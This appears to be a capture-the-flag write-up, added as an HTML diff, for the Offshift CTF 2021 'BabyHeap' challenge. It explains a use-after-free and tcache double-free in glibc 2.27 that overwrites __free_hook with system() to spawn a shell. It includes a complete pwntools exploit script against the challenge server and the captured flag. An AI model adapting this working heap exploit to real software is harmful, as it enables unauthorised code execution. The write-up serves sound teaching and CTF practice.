@@ -1,0 +1,160 @@
+<!--Add date: 01/30/2021-->
+
+<h1>Offshift CTF 2021 - BabyHeap</h1>
+
+<h2>Binary Exploitation - 498 pts</h2>
+
+<h3>Writuep by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Program Behavior</h5>
+
+<p>This is a simple heap challenge using <code>libc-2.27.so</code>. The application gives three functions - allocate and immediately write to a chunk, delete a chunk, and print a chunk. We have 8 available chunks, labeled <code>0..7</code>. There are a couple of exploitable vulnerabilities, but the overarching problem is use-after-free (UAF). After freeing the chunk, the application fails to clear that chunk's address from memory, allowing us to (1) read a deleted chunk, giving us the ability to bypass ASLR and (2) <i>doubly</i> free a chunk.</p>
+
+<img src = "./images/os2021_babyheap_1.png">
+
+<p class = "caption">Figure 1. The chunks are freed, but they aren't cleared from memory.</p>
+
+<p>While the UAF bug is dangerous, it does limit us in one way: the heap pointers are not zeroed out and the allocate function calls <code>malloc()</code> only if a pointer is zero, so we are limited to 8 chunks that can be allocated in total (regardless of whether they are freed). It turns out this is not a problem; in fact, we can (comfortably) perform this exploit with as few as 5 chunks.</p>
+
+<h5>Information Leaks</h5>
+
+<p>Our strategy will be to overwrite <code>__free_hook</code> with <code>system()</code> and subsequently <code>free()</code> a chunk containing <code>/bin/sh</code>. To do this, we need the address of <code>libc</code>. (I also leaked the heap address but this is completely unnecessary for the exploit.) We can get that address by reading a chunk that has been freed to a non-tcache bin, say, unsorted bin. The largest tcache bin holds chunks of size <code>0x410</code>, so if we allocate and free a chunk of size <code>0x420</code> (say, by requesting 0x418 = 1048 bytes), it will be inserted in the unsorted bin. Of course, to prevent merging with the top chunk, we need to allocate another chunk above it - its size does not matter. Upon freeing, the unsorted bin will be as follows:</p>
+
+<p><code>libc.unsorted <=> [large chunk]</code></p>
+
+<p>where the chunk's forward pointer points to <code>libc.unsorted</code>. Reading this chunk after it's freed and subtracting the offset of the unsorted bins gives the required leak.</p>
+
+<img src = "./images/os2021_babyheap_2.png">
+
+<p class = "caption">Figure 2. Leaked libc base address.</p>
+
+<h5>Double Free, Tcache Poisoning, and Arbitrary Write to Free Hook</h5>
+
+<p>Consider the following sequence of operations:</p>
+
+<ol>
+    <li><p>Allocate a small chunk in tcache, say of size 0x30 (request 0x28 bytes). Alternatively, to save a chunk, we can just use the chunk that prevented merging with the top chunk in the leak step above.</p></li>
+    <li>
+        <p>Delete this chunk, resulting in the following tcache state</p>
+        <p><code>tcache[0x30] -> [small chunk] -> NULL</code></p>
+    </li>
+    <li>
+        <p>Delete this chunk, again (double free). The tcache now looks like</p>
+        <p><code>tcache[0x30] -> [small chunk] -> [small chunk] -> NULL</code></p>
+        <p>Note that <code>libc-2.27.so</code> does not have checks for double free in tcaches.</p>
+    </li>
+    <li>
+        <p>Request a chunk of size 0x28. It will be serviced from the head of this tcache. The tcache is now back to</p>
+        <p><code>tcache[0x30] -> [small chunk] -> NULL</code></p>
+        <p>but importantly, we control a chunk that is the next in line to be <code>malloc()</code>ed from this bin. We now write the address of <code>__free_hook</code> to the first 8 bytes of this chunk; this <i>poisons</i> the tcache so that it is now</p>
+        <p><code>tcache[0x30] -> [small chunk] -> __free_hook -> NULL</code></p>
+        <p>(Note that the fake chunk at <code>__free_hook</code> points to NULL, since it has not been initialized. But this doesn't matter for our exploit.)</p>
+    </li>
+    <li>
+        <p>Again, request a chunk of size 0x28. Note that it will return the same small chunk as before. Write <code>/bin/sh</code> to this chunk. Note that by the time we receive this chunk, tcache has already been updated to</p>
+        <p><code>tcache[0x30] -> __free_hook -> NULL</code></p>
+        <p>so we do not need to preserve the address of <code>__free_hook</code> in this chunk.</p>
+    </li>
+    <li>
+        <p>Request another chunk of size 0x28. It will return the fake chunk at <code>__free_hook</code>, which we overwrite with <code>system()</code>.</p>
+    </li>
+    <li>
+        <p>Delete the small chunk, which will <code>free([small chunk] -> "/bin/sh")</code>, prompting the free hook to call <code>system("/bin/sh")</code>. We now have a shell.</p>
+    </li>
+</ol>
+
+<h4>Payload</h4>
+
+<p>Note: In the payload below, the first step commented "first, let's leak the heap address" can be ignored; as discussed before, we do not need a heap leak.</p>
+
+<pre class = "python">
+
+from pwn import *
+
+ready = True
+debug = False
+
+if ready:
+    p = remote("185.172.165.118", 5555)
+    LIBC = ELF("./libc/libc-2.27.so")
+else:
+    p = process("./babyheap")
+    LIBC = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+    if debug:
+        context.terminal = ["/mnt/c/Users/********/wsl-terminal/open-wsl.exe", "-e"]
+        gdb.attach(p, gdbscript = '''
+        break freeing
+        def hook-stop
+        x/5gx &heap_buf
+        end
+        ''')
+
+knownheap_offset = 0x280
+unsorted_offset = 0x3ebca0
+
+def flush():
+    p.recvuntil("4. Exit\n")
+    return
+
+def alloc(idx, size, cont):
+    flush()
+    cont = cont[: size]
+    p.sendline("1")
+    p.recvline()
+    p.sendline(str(size))
+    p.recvline()
+    p.sendline(str(idx))
+    p.recvline()
+    p.send(cont)
+    return
+
+def show(idx):
+    flush()
+    p.sendline("2")
+    p.recvline()
+    p.sendline(str(idx))
+    p.recvline()
+    return p.recvline()[: -1]       #get rid of trailing newline
+
+def delete(idx):
+    flush()
+    p.sendline("3")
+    p.recvline()
+    p.sendline(str(idx))
+    return
+
+# first, let's leak the heap address
+alloc(0, 0x18, "zeroth")
+alloc(1, 0x18, "first")
+alloc(2, 0x18, "second")
+delete(1)                   #tcache[0x20] -> [first] -> NULL
+delete(0)                   #tcache[0x20] -> [zeroth] -> [first] -> NULL , leak from [zeroth].fwd
+heapaddr = u64(show(0).ljust(8, b'\x00')) - knownheap_offset
+log.info("Heap: %s" % (hex(heapaddr)))
+
+# now, let's get a libc address
+# free into non-tcache
+alloc(3, 0x418, "third -- big chunk!")
+alloc(4, 0x28, "fourth")    #just to prevent merging with top
+delete(3)                   #unsorted[0x30] <=> [third]
+LIBC.address = u64(show(3).ljust(8, b'\x00')) - unsorted_offset
+log.info("Libc: %s" % (hex(LIBC.address)))
+
+# double-free tcache
+delete(4)                   #tcache[0x30] -> [fourth] -> NULL
+delete(4)                   #tcache[0x30] -> [fourth] -> [fourth] -> NULL
+alloc(5, 0x28, p64(LIBC.sym["__free_hook"]))
+alloc(6, 0x28, "/bin/sh")   #during this malloc, tcache is poisoned
+alloc(7, 0x28, p64(LIBC.sym["system"]))     #overwrites free_hook with system()
+
+# get shell
+delete(6)
+
+p.interactive()
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>fl4g{us1ng_4_d0ubl3_fr33_1s_s1mpl3r_s41d_th4n_d0n3_8329321}</code></p>
